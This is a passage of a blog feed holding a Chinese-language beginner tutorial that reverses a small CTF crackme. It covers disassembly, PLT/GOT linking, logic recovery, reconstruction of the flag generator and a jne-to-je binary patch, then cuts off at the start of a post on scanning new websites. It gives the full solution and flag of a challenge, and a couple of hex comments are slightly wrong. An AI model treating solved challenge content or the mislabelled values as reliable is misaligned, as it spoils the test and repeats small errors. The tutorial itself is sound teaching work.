0x0000000000400b71 &lt;+83>:\tmov    rdi,rax<br>   0x0000000000400b74 &lt;+86>:\tcall   0x400850 &lt;_ZNSirsERi@plt><br>   0x0000000000400b79 &lt;+91>:\tmov    edx,DWORD PTR [rbp-0xc]<br>   0x0000000000400b7c &lt;+94>:\tmov    eax,DWORD PTR [rbp-0x10]<br>   0x0000000000400b7f &lt;+97>:\tadd    edx,eax<br>   0x0000000000400b81 &lt;+99>:\tmov    eax,DWORD PTR [rbp-0x14]<br>   0x0000000000400b84 &lt;+102>:\tadd    eax,edx<br>   0x0000000000400b86 &lt;+104>:\tmov    edi,eax<br>   0x0000000000400b88 &lt;+106>:\tcall   0x40094d &lt;_Z3geni><br>   0x0000000000400b8d &lt;+111>:\tmov    QWORD PTR [rbp-0x8],rax<br>   0x0000000000400b91 &lt;+115>:\tmov    edx,DWORD PTR [rbp-0xc]<br>   0x0000000000400b94 &lt;+118>:\tmov    eax,DWORD PTR [rbp-0x10]<br>   0x0000000000400b97 &lt;+121>:\tadd    edx,eax<br>   0x0000000000400b99 &lt;+123>:\tmov    eax,DWORD PTR [rbp-0x14]<br>   0x0000000000400b9c &lt;+126>:\tadd    eax,edx<br>   0x0000000000400b9e &lt;+128>:\tcmp    eax,0x539<br>   0x0000000000400ba3 &lt;+133>:\tjne    0x400bcc &lt;main+174><br>   0x0000000000400ba5 &lt;+135>:\tmov    esi,0x400ce6<br>   0x0000000000400baa &lt;+140>:\tmov    edi,0x6021a0<br>   0x0000000000400baf &lt;+145>:\tcall   0x400830 &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt><br>   0x0000000000400bb4 &lt;+150>:\tmov    rax,QWORD PTR [rbp-0x8]<br>   0x0000000000400bb8 &lt;+154>:\tmov    rdi,rax<br>   0x0000000000400bbb &lt;+157>:\tcall   0x400ae3 &lt;_Z9print_ptrPc><br>   0x0000000000400bc0 &lt;+162>:\tmov    edi,0x400cef<br>   0x0000000000400bc5 &lt;+167>:\tcall   0x4007c0 &lt;puts@plt><br>   0x0000000000400bca &lt;+172>:\tjmp    0x400bdb &lt;main+189><br>   0x0000000000400bcc &lt;+174>:\tmov    esi,0x400cf1<br>   0x0000000000400bd1 &lt;+179>:\tmov    edi,0x6021a0<br>   0x0000000000400bd6 &lt;+184>:\tcall   0x400830 &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt><br>   0x0000000000400bdb &lt;+189>:\tmov    rax,QWORD PTR [rbp-0x8]<br>   0x0000000000400bdf &lt;+193>:\tmov    rdi,rax<br>   0x0000000000400be2 &lt;+196>:\tcall   0x400840 &lt;free@plt><br>   0x0000000000400be7 &lt;+201>:\tmov    eax,0x0<br>   0x0000000000400bec &lt;+206>:\tleave  <br>   0x0000000000400bed &lt;+207>:\tret    <br>End of assembler dump.</code></pre>\n<p>哇，這些密密麻麻的怎麼看？！從第一行開始讀嗎？</p>\n<blockquote>\n<p>首先，最重要的是理出邏輯，也就是要辨別『用了哪些函數』跟『經過哪些判斷式』。</p>\n</blockquote>\n<p>『用了哪些函數』簡單，只要找出所有的 <code>call</code> 指令就行了。上面用到的就有好幾個，例如好短的 <code>&lt;_Z3geni&gt;</code> <code>&lt;puts@plt&gt;</code>跟這個好長的<code>&lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&gt;</code>。有人可能會發現，怎麼有些函數後面加了一個 <code>@plt</code> 呢？</p>\n<p>這裡要先講『函數』是怎麼被儲存跟存取的。寫過一點程式的人應該都用過一些 standard library 或是第三方函式庫，有沒有想過程式執行起來的時候怎麼抓到或引用這些外部函數呢？</p>\n<h3 id=\"linking\"><a class=\"direct-link\" href=\"#linking\">#</a> Linking</h3>\n<p>在編譯程式碼的時候，有 dynamic linking 和 static linking 兩種方法，簡單對比的話，dynamic linking 就是只把作者自己定義的函數跟邏輯包進執行檔，而 static linking 則會把外部引用的函數一起包進去。所以 static linking 產生的檔案會大很多，而 dynamic linking 則會需要檔案執行者本機上的函示庫支援。到了執行的時候，statically linked 的檔案就可以直接在執行檔裡找到函數，dynamically linked 則是在程式跑起來的時候，作業系統才會做 linking，把各個要調用的外部函數的位置填到這隻程式的一張表裡，方便執行時查詢呼叫。剛剛說要『填入的一張表』就是 GOT（Global Offsets Table），是一個可讀可寫的記憶體空間；而 PLT（Procedure Linkage Table）就是『執行時查詢呼叫』的另一張表，是一個可讀可執行的記憶體空間。</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-02/plt-got.png\" /><figcaption><p>GOT PLT table</p>\n</figcaption></figure></p>\n<p>我們用上面這張圖簡單說明一下。</p>\n<p>當程式跑起來時，dynamic linker 會做幾件事：</p>\n<ol>\n<li>把引用到的外部檔案 load 到 memory</li>\n<li>創建 PLT 與 GOT，PLT 中的欄位指向對應的 GOT 欄位</li>\n<li>在 GOT 欄位中放入一個 default stub（可以先想成是一個機關）。</li>\n</ol>\n<p>第一次遇到 <code>call func@plt</code> 的指令時，程式就會戳到 GOT 欄位裡的 default stub，觸發機關使 dynamic linker 依據剛剛 load 進來的函式庫跟 <code>func</code> 在外部檔案中的 offset 算出此時 <code>func</code> 在記憶體中的位置並且填入表中，變成下面那張圖的樣子。此後，任何的 <code>call func@plt</code> 指令就會順利呼叫到 <code>0x7fff12b0</code> 這個位置的函數啦！</p>\n<p>以上是一個非常簡略的介紹，其實 linker 的機制還有非常多細節，有興趣的可以參考大佬 <a href=\"https://www.airs.com/blog/archives/41\">Ian Lance Taylor 的一系列文章</a>。</p>\n<p>不過經過這個簡略的介紹，大家可以記得兩件事：</p>\n<ul>\n<li>GOT 可寫，PLT 可執行</li>\n<li>通常用 <code>@plt</code> 呼叫的指令是外部函數，常常是標準函式庫，看不懂可以直接 google 查詢，都找得到詳盡的文件</li>\n</ul>\n<h3 id=\"function-calls\"><a class=\"direct-link\" href=\"#function-calls\">#</a> Function calls</h3>\n<p>好的，那上面 <code>main</code>的函數有哪些呢？又是什麼意思呢？幫你查好了！</p>\n<ul>\n<li><code>_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt</code>：basic <code>ostream</code>，也就是 <code>cout</code> 用到的 <code>&lt;&lt;</code></li>\n<li><code>_ZNSirsERi@plt</code>：<code>istream</code>，也就是 <code>cin</code> 用到的<code>&gt;&gt;</code></li>\n<li><code>_Z3geni</code>：作者自定義的函數，看起來本來是 <code>gen()</code>，應該是用來產生 flag 的函數</li>\n<li><code>_Z9print_ptrPc</code>：作者自定義的函數，看起來本來是 <code>print_ptr()</code>，應該是印出某些東西</li>\n<li><code>puts@plt</code>：libc <code>put</code> function</li>\n<li><code>free@plt</code>：libc <code>free</code> function</li>\n</ul>\n<p>小提示：判別函數除了查詢之外，也可以從剛剛的 assembly 看出一點端倪！我們知道函數接收參數是用 <code>rdi</code> <code>rsi</code> ，那就可以把一些已知位置的記憶體印出來。</p>\n<p>例如 <code>main+39</code> 的 <code>_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc</code> 前面是 <code>mov esi,0x400cd0; mov edi,0x6021a0</code>， <code>main+56</code> 的 <code>_ZNSirsERi</code> 前面是 <code>mov edi,0x602080</code>：</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-02/cin-cout.png\" /><figcaption><p>cin cout</p>\n</figcaption></figure></p>\n<p>最後 <code>main+145</code> 的 <code>_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc</code> 前面是 <code>mov esi,0x400ce6; mov edi,0x6021a0</code>， <code>main+167</code> 的 <code>puts@plt</code> 前面是 <code>mov edi,0x400cef</code>：</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-02/flag-cout.png\" /><figcaption><p>print flag</p>\n</figcaption></figure></p>\n<p>標準函式庫的參數都可以在文件上查到，只要對應著前一篇提過的 register 的順序就可以推敲出每塊資料的意義了喔！</p>\n<h3 id=\"conditionals\"><a class=\"direct-link\" href=\"#conditionals\">#</a> Conditionals</h3>\n<p>再來判別程式的邏輯，最重要的就是找出 <code>cmp</code> 指令並回推必要的條件。以下節錄判斷邏輯，省略的部分跟函數呼叫我用註解寫上他們的功能。</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">Dump of assembler code for function main:<br>   .....snip...... # setup and print prompt  <br>   0x0000000000400b4a &lt;+44>:\tlea    rax,[rbp-0xc]<br>   0x0000000000400b4e &lt;+48>:\tmov    rsi,rax<br>   0x0000000000400b51 &lt;+51>:\tmov    edi,0x602080<br>   0x0000000000400b56 &lt;+56>:\tcall   0x400850 &lt;_ZNSirsERi@plt>    # cin to [rbp-0xc] <br>   0x0000000000400b5b &lt;+61>:\tlea    rdx,[rbp-0x10]<br>   0x0000000000400b5f &lt;+65>:\tmov    rsi,rdx<br>   0x0000000000400b62 &lt;+68>:\tmov    rdi,rax<br>   0x0000000000400b65 &lt;+71>:\tcall   0x400850 &lt;_ZNSirsERi@plt>    # cin to [rbp-0x10]<br>   0x0000000000400b6a &lt;+76>:\tlea    rdx,[rbp-0x14]<br>   0x0000000000400b6e &lt;+80>:\tmov    rsi,rdx<br>   0x0000000000400b71 &lt;+83>:\tmov    rdi,rax<br>   0x0000000000400b74 &lt;+86>:\tcall   0x400850 &lt;_ZNSirsERi@plt>    # cin to [rbp-0x14]<br>   .....snip...... # generate something from input<br>   0x0000000000400b91 &lt;+115>:\tmov    edx,DWORD PTR [rbp-0xc]<br>   0x0000000000400b94 &lt;+118>:\tmov    eax,DWORD PTR [rbp-0x10]<br>   0x0000000000400b97 &lt;+121>:\tadd    edx,eax<br>   0x0000000000400b99 &lt;+123>:\tmov    eax,DWORD PTR [rbp-0x14]<br>   0x0000000000400b9c &lt;+126>:\tadd    eax,edx<br>   0x0000000000400b9e &lt;+128>:\tcmp    eax,0x539                    # compare to 1337!<br>   0x0000000000400ba3 &lt;+133>:\tjne    0x400bcc &lt;main+174><br>   .....snip...... # success, print flag<br>   0x0000000000400bcc &lt;+174>:\tmov    esi,0x400cf1                 # 'nope.'<br>   0x0000000000400bd1 &lt;+179>:\tmov    edi,0x6021a0<br>   0x0000000000400bd6 &lt;+184>:\tcall   0x400830 &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt><br>   .....snip...... # clean up, free buffer<br>   0x0000000000400bec &lt;+206>:\tleave  <br>   0x0000000000400bed &lt;+207>:\tret  </code></pre>\n<p>首先注意到 <code>main+128</code> 的 <code>cmp eax,0x539</code>。</p>\n<p>下一行的 <code>jne 0x400bcc &lt;main+174&gt;</code> 告訴我們，如果 <code>eax</code> 的值不是 1337（把十六進位轉成十進位），那邏輯就會跳到 <code>main+174</code>，也就是印出失敗字串 “nope.” 的地方，所以我們的目標是讓：<code>eax=1337</code>。</p>\n<p>往回推，<code>eax=eax+edx (main+126)</code>，又本來的 <code>eax=[rbp-0x14] (main+123)</code>、本來的<code>edx=edx+eax=[rbp-0xc]+[rbp-0x10] (main+115~121)</code>，也就是說，最後 <code>eax</code> 的值其實就是 <code>[rbp-0x14]+[rbp-0xc]+[rbp-0x10]</code>。</p>\n<p>那這三個記憶體又是哪來的呢？</p>\n<p>再往前看一些你就會發現，這三塊其實就是 <code>cin</code> 吃進來的三個數字，也就是我們一開始輸入的值呀！往上看到一進入 <code>main</code> 的前幾行，有把這三塊記憶體清空的指令，其實就是把這三個 4 byte 大小的 int 區域變數初始化為 0 的舉動。</p>\n<p>其實到這裡，這一題就已經解完了。我們只要輸入任意三個相加為 1337 的數字就可以成功拿到 flag 了！</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-02/reversed.png\" /><figcaption><p>reversed</p>\n</figcaption></figure></p>\n<p>根據上面的分析，我們可以手動還原 <code>main</code>的 cpp code。建議你可以先自己試試看，練習完再來看下面這段！</p>\n<pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">int</span> a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">,</span>c <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> flag<span class=\"token punctuation\">;</span><br>    std<span class=\"token double-colon punctuation\">::</span>cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"Enter three numbers!\"</span> <span class=\"token operator\">&lt;&lt;</span> std<span class=\"token double-colon punctuation\">::</span>endl<span class=\"token punctuation\">;</span><br>    std<span class=\"token double-colon punctuation\">::</span>cin <span class=\"token operator\">>></span> a <span class=\"token operator\">>></span> b <span class=\"token operator\">>></span> c <span class=\"token punctuation\">;</span><br>    a <span class=\"token operator\">=</span> a <span class=\"token operator\">+</span> b<span class=\"token punctuation\">;</span><br>    a <span class=\"token operator\">=</span> a <span class=\"token operator\">+</span> c<span class=\"token punctuation\">;</span><br><br>    flag <span class=\"token operator\">=</span> <span class=\"token function\">gen</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>a <span class=\"token operator\">==</span> <span class=\"token number\">1337</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>        std<span class=\"token double-colon punctuation\">::</span>cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"FLAG{\"</span> <span class=\"token punctuation\">;</span><br>        <span class=\"token function\">print_ptr</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        std<span class=\"token double-colon punctuation\">::</span>cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"}\"</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<h3 id=\"that%E2%80%99s-it%3F\"><a class=\"direct-link\" href=\"#that%E2%80%99s-it%3F\">#</a> That’s it?</h3>\n<p>就這樣了嗎？是不是有點空虛？我們都還沒看過自定義的函數呢！</p>\n<p>為了物盡其用，我們拿簡單的 <code>print_ptr()</code> 來看一下『迴圈』長什麼樣子。</p>\n<p>從頭 trace 一下，略過前面 function prologue，在 <code>+8</code> 的地方把參數 <code>rdi</code> 放到 <code>rbp-0x18</code>，然後把 <code>rbp-0x4</code> 設成 0。接著，邏輯跳到 <code>+51</code> 的地方，這時我們才剛把 <code>rbp-0x4</code> 設成 0，跟 0x14 做比較當然 <code>jle</code>(<strong>j</strong>ump if <strong>l</strong>ess than or <strong>e</strong>qual)會成立，然後跳回到 <code>+21</code> 的地方，最後呼叫 <code>putchar@plt (+42)</code>。字元印出來後，會把 <code>rbp-0x4</code> 加 1，然後繼續判斷是否大於 0x14，否則再度跳回 <code>+21</code> 呼叫 <code>putchar@plt (+42)</code>。這個『加一、判斷』的循環會一直持續到 <code>rbp-0x4=0x15</code> 為止，然後整個函數就會結束。</p>\n<p>聰明的你一定發現了，<code>rbp-0x4</code> 根本就是一個計數器（counter），這一整段程式跳來跳去其實就是為了重複執行 <code>+21</code> 到 <code>+42</code> 的部分，跑一個 0x15 次（0 到 0x14）的迴圈逐個印出 <code>gen()</code> 產生的 flag 的每一個字元。因爲實在太短了，我直接把還原的 cpp 寫在這：</p>\n<pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">&lt;</span><span class=\"token number\">0x15</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>  <br>    <span class=\"token function\">put_char</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <br><span class=\"token punctuation\">}</span></code></pre>\n<p>這種很短的『加減＋判斷＋ jump』組合，常常都是迴圈的邏輯喔！</p>\n<p>再來看看這題最複雜的 <code>gen()</code>，因為他的組語太長我就不放上來了，請自己操作配著以下敘述觀察思考。<code>gen()</code> 的邏輯是先用 <code>malloc()</code> 拿到一塊記憶體，然後使用參數值，也就是三個數字的總和（就是 1337 啦）進行一些運算來產生 flag。小提醒：字串是由許多連續的字元或位元構成，因此我們可以用『字串頭的記憶體位置』加上『第幾個字元』來做 string indexing。</p>\n<p>有興趣多練習的人可以試著自己 reverse 看看 <code>gen()</code>，我在這裡也附上參考的 cpp code 還有 ascii decode 結果。</p>\n<pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">char</span><span class=\"token operator\">*</span> <span class=\"token function\">gen</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>result <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">22</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>       <span class=\"token comment\">// 0x16 = 22 (dec)</span><br>  <br>    <span class=\"token operator\">*</span>result <span class=\"token operator\">=</span> <span class=\"token number\">121</span><span class=\"token punctuation\">;</span>                           <span class=\"token comment\">// 0x79 = 121     -> 'y'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>a<span class=\"token operator\">/</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span> <span class=\"token operator\">-</span><span class=\"token number\">7</span> <span class=\"token operator\">+</span> <span class=\"token string\">'0'</span><span class=\"token punctuation\">;</span>         <span class=\"token comment\">// 0x30 = '0'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a <span class=\"token operator\">+</span> <span class=\"token number\">0x3c</span><span class=\"token punctuation\">;</span>                    <span class=\"token comment\">// 0x529+0x3c=0x75 ->'u'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'_'</span><span class=\"token punctuation\">;</span>                         <span class=\"token comment\">// 0x5f = '_'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> result<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x14</span><span class=\"token punctuation\">;</span>            <span class=\"token comment\">// 0x75-0x14=0x61 -> 'a'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> result<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">;</span>            <span class=\"token comment\">// 0x61-0x03=0x64 -> 'd'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> result<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>                   <span class=\"token comment\">// 'd'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x65</span><span class=\"token punctuation\">;</span>                        <span class=\"token comment\">// 'e'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> result<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>                   <span class=\"token comment\">// 'd'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> result<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>                   <span class=\"token comment\">// '_'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x74</span><span class=\"token punctuation\">;</span>                       <span class=\"token comment\">// 't'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> result<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0xc</span><span class=\"token punctuation\">;</span>           <span class=\"token comment\">// 0x74-0xc=0x68 -> 'h'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x72</span><span class=\"token punctuation\">;</span>                       <span class=\"token comment\">// 'r'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x33</span><span class=\"token punctuation\">;</span>                       <span class=\"token comment\">// 'e'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x33</span><span class=\"token punctuation\">;</span>                       <span class=\"token comment\">// 'e'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> result<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>                  <span class=\"token comment\">// '_'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x6e</span><span class=\"token punctuation\">;</span>                       <span class=\"token comment\">// 'n'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> result<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>                  <span class=\"token comment\">// 'u'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> result<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x1</span><span class=\"token punctuation\">;</span>           <span class=\"token comment\">// 0x6e-0x1=0x6d -> 'm'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x73</span><span class=\"token punctuation\">;</span>                       <span class=\"token comment\">// 's'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x21</span><span class=\"token punctuation\">;</span>                       <span class=\"token comment\">// '!'</span><br>    result<span class=\"token punctuation\">[</span><span class=\"token number\">21</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span>                         <span class=\"token comment\">// '\\n'</span><br><br>    <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<h3 id=\"patching\"><a class=\"direct-link\" href=\"#patching\">#</a> Patching</h3>\n<p>最後結束前來講另一個不錯的想法：直接更改判斷式 patch binary 讓印出 flag 的條件成立，這樣就不用管條件啦！</p>\n<p>Patching 的確是一個常見又簡單的方法的方法，這題只要把 <code>main+133</code> 的 <code>jne 0x400bcc</code> 改成相反的 <code>je 0x400bcc</code> 就可以觸發印出 flag 的邏輯。</p>\n<p>我們從 assembly dump 可以看到 <code>jne 0x400bcc</code> 在 <code>0x400ba3</code> 的地方。另外，從 ELF header 可以看到程式跑起來會被 load 在 <code>0x400000</code> 的位置，所以我們在 ELF 中要找的就是 <code>0x400ba3 — 0x400000 = 0xba3</code> 這個 offset。</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-02/codebase.png\" /><figcaption><p>find codebase</p>\n</figcaption></figure></p>\n<p>我們可以用 vim + xxd mode 找到 <code>0xba3</code> 的位置（記得 little endian 嗎），看到代表 <code>jne</code> 的 75。再來只要把它編輯成代表 <code>je</code> 的 74 再存檔，我們就 patch 好了！</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-02/xxd-patch.png\" /><figcaption><p>patch in vim+xxd</p>\n</figcaption></figure></p>\n<p>於是我們很興奮地把它跑起來，為了確定真的有影響『印 flag 的邏輯』還先輸入正確數字並看到確實出現 “nope”。結果… flag 怎麼是個亂七八糟的東西！</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-02/messed-flag.png\" /><figcaption><p>messed up!</p>\n</figcaption></figure></p>\n<p>抱歉啦，出題者為了防止這種解法，加了產生 flag 的 <code>gen()</code>，所以數字總合如果不是 1337，產出的 flag 也會是不對的！</p>\n<p>（作者 murmur：而且看出邏輯是三數總合應該還比 patch 簡單吧？</p>\n<h2 id=\"%E7%B5%90%E8%AA%9E\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AA%9E\">#</a> 結語</h2>\n<p>恭喜大家成功 reverse 了第一隻小程式，看懂邏輯的剎那有沒有覺得成就感爆棚呢！雖然這是邏輯非常直觀的題目，不過練習判斷程式中『哪裡是重要邏輯』是成為逆向大師的關鍵第一步！</p>\n<p>作為進階一點的挑戰，你可以試試自己寫一隻 hello world 小程式，看看 compile 成不同架構跟處理器後再 disassemble 有何不同喔！</p>\n<h4 id=\"%E5%82%99%E8%A8%BB%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E5%82%99%E8%A8%BB%EF%BC%9A\">#</a> 備註：</h4>\n<p><code>lea</code> 和 <code>mov</code> 有何不同？更精確一些，下面這兩種有何不同？</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">LEA rax, [RBP+5] ; Compute address of valueMOV rax, [RBP+5] ; Load value at that address</code></pre>\n<p><code>lea</code> 代表 load effective address，裝到暫存器的是『指到目標記憶體的 pointer』，常用於記憶體位置運算。</p>\n<p><code>mov</code> 代表 load value，裝到暫存器的是『目標記憶體內的值』，常用於值的運算與傳遞。</p>\n",
      "date_published": "2021-07-30T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/nick/website-go-live-attack/",
      "url": "https://tech-blog.cymetrics.io/posts/nick/website-go-live-attack/",
      "title": "為什麼網站才剛上線就被攻擊？",
      "content_html": "<p><img src=\"/img/posts/nick/website-go-live-attack/1.jpg\" alt=\"Photo by Arget on Unsplash\"></p>\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<!-- summary -->\n<!-- 剛出生的嬰兒最好欺負，網站也是一樣，網站初建時不管是為了方便測試或維護，都會對外開放較多的服務，駭客也容易在此時趁虛而入。本文將介紹從這些剛上線的網站中整理出的 5 種最常見卻有弱點的服務。-->\n<!-- summary -->\n<p>剛出生的嬰兒最好欺負，網站也是一樣，網站初建時不管是為了方便測試或維護，都會對外開放較多的服務，駭客也容易在此時趁虛而入。<br>\n本文會先簡單介紹一下駭客如何找到新建立的網站，並實測一下這個方法可以找出多少 7 天內架設的網站，再從這些網站的掃描結果中整理出 5 種最常見且有弱點的服務，並討論一下弱點可能帶來的風險與防範方式 。</p>\n<h2 id=\"%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%B4%B9\"><a class=\"direct-link\" href=\"#%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%B4%B9\">#</a> 工具介紹</h2>\n<p>這邊介紹兩個測試中用到的工具，第一個工具整理了每天有哪些人來申請新的網域，因為新網域上大多也是新建立的網站，所以這些網域上的網站就是我們的測試對象。另外一個工具則是去掃描這些網站開放了那些服務。</p>\n<h3 id=\"1.-whois-data-center\"><a class=\"direct-link\" href=\"#1.-whois-data-center\">#</a> 1. Whois Data Center</h3>\n<p><img src=\"/img/posts/nick/website-go-live-attack/2.jpg\" alt=\"Photo by Arget on Unsplash\"></p>\n<h3 id=\"%E7%B0%A1%E4%BB%8B-%3A\"><a class=\"direct-link\" href=\"#%E7%B0%A1%E4%BB%8B-%3A\">#</a> 簡介 :</h3>\n<p>Whois Data Center 收集了從 1985 年以來全球 Whois 資料庫的數據，更重要的是將些龐大的數據整理與分門別類，像是新註冊的網域、即將過期的網域、已經刪除的網域等等，可惜的是大部份功能與資料都要收費。</p>\n<h3 id=\"%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AD%98-%3A\"><a class=\"direct-link\" href=\"#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AD%98-%3A\">#</a> 背景知識 :</h3>\n<h4 id=\"%E7%B6%B2%E5%9F%9F(domain)%3A\"><a class=\"direct-link\" href=\"#%E7%B6%B2%E5%9F%9F(domain)%3A\">#</a> 網域(Domain):</h4>\n<p>在網路的世界中，網站會有一組 IP 